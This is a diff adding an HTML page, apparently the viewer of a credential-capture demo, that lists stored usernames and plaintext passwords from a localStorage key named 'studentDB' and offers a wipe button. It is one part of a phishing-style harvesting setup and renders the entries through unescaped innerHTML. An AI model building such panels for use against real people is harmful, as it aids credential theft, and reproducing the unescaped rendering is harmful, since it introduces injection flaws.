@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Captured Credentials</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        tr:nth-child(even) { background-color: #fafafa; }
+    </style>
+</head>
+<body>
+    <h2>Captured User Credentials</h2>
+    
+    <table>
+        <thead>
+            <tr>
+                <th>Timestamp</th>
+                <th>Username</th>
+                <th>Password</th>
+            </tr>
+        </thead>
+        <tbody id="dataTable">
+            </tbody>
+    </table>
+
+    <br>
+    <button onclick="clearData()" style="color: red;">Wipe Database</button>
+
+    <script>
+        const database = JSON.parse(localStorage.getItem('studentDB')) || [];
+        const tableBody = document.getElementById('dataTable');
+
+        if (database.length === 0) {
+            tableBody.innerHTML = "<tr><td colspan='3'>No data captured yet.</td></tr>";
+        } else {
+            database.forEach(entry => {
+                const row = `<tr>
+                    <td>${entry.time}</td>
+                    <td>${entry.username}</td>
+                    <td>${entry.password}</td>
+                </tr>`;
+                tableBody.innerHTML += row;
+            });
+        }
+
+        function clearData() {
+            if(confirm("Are you sure you want to delete all captured data?")) {
+                localStorage.removeItem('studentDB');
+                location.reload();
+            }
+        }
+    </script>
+</body>
+</html>
